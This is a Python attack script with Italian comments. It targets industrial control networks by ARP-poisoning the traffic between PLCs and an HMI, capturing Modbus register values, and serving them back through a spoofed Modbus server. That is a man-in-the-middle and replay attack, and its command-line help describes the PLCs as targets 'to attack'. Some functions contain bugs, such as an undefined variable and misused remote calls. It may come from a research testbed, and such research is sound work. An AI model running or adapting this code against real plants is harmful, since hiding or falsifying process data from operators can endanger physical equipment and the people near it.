import argparse
import json
import threading
import subprocess
import requests
from scapy.all import ARP, Ether, sr, sendp, sniff, get_if_hwaddr
import glob
import os
import pandas as pd
from datetime import datetime
import time
import ray
import modbus_tk
import modbus_tk.defines as cst
from modbus_tk import modbus_tcp, hooks
import logging
import itertools
import configparser
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

def handle_arp_packet(packet):
    if ARP in packet and packet[ARP].op == "is-at":
        # Elabora il pacchetto ARP qui
        # Estrarre l'indirizzo MAC e l'indirizzo IP dal pacchetto
        mac = packet[ARP].hwsrc
        ip = packet[ARP].psrc
        print(f"Received ARP Response - IP: {ip}, MAC: {mac}")

def p(packet):
    print(packet)

def get_mac(ip):
    # Crea il pacchetto ARP per richiedere l'indirizzo MAC
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    print(arp_request)
    # Invia il pacchetto ARP e ottieni la risposta
    arp_response, unanswered = sr(ARP(op="who-has", psrc='172.17.0.1', pdst=ip))
    print("stampa unanswered", unanswered)
    #sniff(prn=p, filter="arp", store=False)
    print(arp_response)
    # Estrai l'indirizzo MAC dalla risposta
    if arp_response:
        return arp_response[0][1].hwsrc
    return None

def arp_poison(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac):
    plc_macs = [get_mac(ip) for ip in plc_ips]
    print("plc_macs", plc_macs)
    hmi_mac = get_mac(hmi_ip)
    print("hmi_mac", hmi_mac)
    if None in plc_macs or hmi_mac is None:
        print("Failed to retrieve MAC addresses of PLCs or HMI.")
        return
    # Aggiungi la cattura dei pacchetti ARP
    #sniff(prn=handle_arp_packet, filter="arp", store=False)
    while True:
        for plc_mac in plc_macs:
            target_packet = ARP(op=2, pdst=target_ip, hwdst=plc_mac, psrc=gateway_ip, hwsrc=attacker_mac)
            #print("target_packet", target_packet)
            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=plc_mac, psrc=target_ip, hwsrc=attacker_mac)
            #print("gateway_packet", gateway_packet)
            sendp(target_packet, verbose=False)
            sendp(gateway_packet, verbose=False)

        time.sleep(2)

class ModbusServer(threading.Thread):
    def __init__(self, ip, port, json_files):
        threading.Thread.__init__(self)
        self.server = modbus_tcp.TcpServer(address=ip, port=port)
        self.json_files = json_files
        self.manual_start = False
        self.capture_started = threading.Event()  # Event to signal when capture starts
        self.capture_duration = 0  # Duration of capture in seconds
        self.captured_data = []  # Captured data from registers

        hooks.install_hook(cst.READ_HOLDING_REGISTERS, self.read_data)

    def run(self):
        self.server.start()
        if self.manual_start:
            input("Press Enter to start Modbus slave...")
        else:
            self.capture_started.wait()  # Wait for capture to start
            time.sleep(self.capture_duration)  # Wait for the capture duration
        self.server._do_exit = False

    def stop(self):
        self.server.stop()
        self.server._do_exit = True

    def read_data(self, args, slave_id, function_code, starting_address, quantity):
        response = []
        for data in self.captured_data:
            if data['address'] >= starting_address and data['address'] + data['quantity'] <= starting_address + quantity:
                response.extend(data['values'])
        return response

def parse_config_file(config_file):
    config = configparser.ConfigParser()
    config.read(config_file)

    plc_ips = []
    plc_ports = []
    plc_names = []
    hmi_ip = config.get("Network", "hmi_ip")
    hmi_port = config.get("Network", "hmi_port")

    for section in config.sections():
        if section.startswith('PLC'):
            plc_names.append(section[3:])
            plc_ips.append(config.get(section, 'ip'))
            plc_ports.append(config.get(section, 'port'))

    return plc_names, plc_ips, plc_ports, hmi_ip, hmi_port

@ray.remote
def read_registers(name, ip, port, master, types_of_registers):
    single_plc_registers = defaultdict(dict)

    if 'DiscreteInputRegisters' in types_of_registers:
        single_plc_registers[ip]['DiscreteInputRegisters'] = read_di(master)
    if 'InputRegisters' in types_of_registers:
        single_plc_registers[ip]['InputRegisters'] = read_ir(master)
    # Aggiungi qui la lettura degli altri tipi di registri necessari

    with open(f'historian/{name}.json', 'w') as sp:
        sp.write(json.dumps(single_plc_registers, indent=4))

def capture_registers(plc_names, plc_ips, plc_ports):
    ray.init()
    masters = []
    with ThreadPoolExecutor() as executor:
        for ip, port in zip(plc_ips, plc_ports):
            master = modbus_tcp.TcpMaster()
            master.set_timeout(5.0)
            master = modbus_tcp.TcpMaster(host=ip, port=int(port))
            masters.append(master)
            executor.submit(read_registers, name, ip, port, master, ['DiscreteInputRegisters', 'InputRegisters'])
    ray.shutdown()

def read_c(master):
    """read coils, coils are addressed as follows: [0-xxx].[0-7]

    Args:
        master (object): to send the read command to the right plc
    """
    registers = {}
    values = master.execute(1, cst.READ_COILS, 0, 90)
    count = 0
    for c in range(0, 11):
        for a in range(0, 8):
            registers['%QX' + str(c) + '.' + str(a)] = str(values[count])
            count += 1

    return registers

def read_ir(master):
    """read input registers, ir are addressed as follows: [0-xxx]

    Args:
        master (object): to send the read command to the right plc
    """
    registers = {}
    values = master.execute(1, cst.READ_INPUT_REGISTERS, 0, 110)
    c = 0
    for i in values:
        registers['%IW' + str(c)] = str(i)
        c += 1
    return registers

def read_di(master):
    """read discrete input, di are addressed as follows: [0-xxx].[0-7]

    Args:
        master (object): to send the read command to the right plc
    """
    registers = {}
    values = master.execute(1, cst.READ_DISCRETE_INPUTS, 0, 90)
    count = 0
    for c in range(0, 11):
        for a in range(0, 8):
            registers['%IX' + str(c) + '.' + str(a)] = str(values[count])
            count += 1
    return registers

def read_mr(master):
    """read memory registers, mr are addressed as follows: [0-xxx] and are holding registers starting from the address 1024

    Args:
        master (object): to send the read command to the right plc
    """
    registers = {}
    values = master.execute(1, cst.READ_HOLDING_REGISTERS, 1024, 11)
    c = 0
    for i in values:
        registers['%MW' + str(c)] = str(i)
        c += 1
    return registers

def read_hr(master):
    """read holding registers, hr are addressed as follows: [0-xxx]

    Args:
        master (object): to send the read command to the right plc
    """
    registers = {}
    values = master.execute(1, cst.READ_HOLDING_REGISTERS, 0, 110)
    c = 0
    for i in values:
        registers['%QW' + str(c)] = str(i)
        c += 1
    return registers

def start_capture(capture_duration, capture_started_event, server, plc_names, plc_ips, plc_ports):
    time.sleep(capture_duration)  # Wait for the specified capture duration
    capture_started_event.set()  # Signal that capture has started
    capture_registers(plc_names, plc_ips, plc_ports)
    server.stop()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--plc', nargs='+', help='IP addresses of PLCs to attack')
    parser.add_argument('--time', type=int, help='Capture duration in minutes')
    parser.add_argument('--prefix', nargs='+', help='Prefixes for JSON file selection, containing PLC info')
    parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
    parser.add_argument('--condition', type=str, help='Condition to start the capture')
    args = parser.parse_args()

    if not args.plc:
        print('Please provide the IP addresses of the PLCs to attack')
        return

    if not args.time:
        print('Please provide the capture duration')
        return

    prefixes = args.prefix

    config_file = "config.ini"

    config = configparser.ConfigParser()
    config.read(config_file)

    plc_names, plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file)

    print("Config file:", config_file)
    print("plc_names:", plc_names)
    print("plc_ips:", plc_ips)
    print("plc_ports:", plc_ports)
    print("hmi_ip", hmi_ip)
    print("hmi_port", hmi_port)

    directory = "registerCapture/historian/"

    json_files = []
    for prefix in prefixes:
        json_files.extend(glob.glob(os.path.join(directory, f"{prefix}*.json")))

    if not json_files:
        print('No JSON files found with the specified prefixes')
        return

    server_ip = '0.0.0.0'
    server_port = 508

    server = ModbusServer(server_ip, server_port, json_files)

    if args.manual:
        server.manual_start = True

    server.start()

    print(f"Modbus Server running on {server_ip}:{server_port}")

    target_ip = plc_ips[0].split(":")[0]
    print("target_ip",target_ip)
    gateway_ip = hmi_ip
    print("gateway_ip",gateway_ip)
    attacker_mac = get_if_hwaddr('docker0')  # Replace "eth0" with your network interface name
    print("attacker_mac",attacker_mac)
    arp_poison_thread = threading.Thread(target=arp_poison, args=(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac))
    arp_poison_thread.start()

    try:
        if args.condition:
            print(f"Waiting for condition '{args.condition}' to start the capture...")
            while True:
                # Implement your condition logic here
                if args.condition == 'start':
                    capture_duration = args.time * 60  # Capture duration in seconds
                    capture_started_event = threading.Event()
                    capture_thread = threading.Thread(target=start_capture, args=(capture_duration, capture_started_event, server, plc_names, plc_ips, plc_ports))
                    capture_thread.start()
                    server.capture_duration = capture_duration
                    server.capture_started = capture_started_event
                    break
                time.sleep(1)  # Wait for 1 second before checking the condition again
        else:
            time.sleep(args.time * 60)  # Capture duration in minutes
    except KeyboardInterrupt:
        pass

    arp_poison_thread.join()

if __name__ == '__main__':
    main()
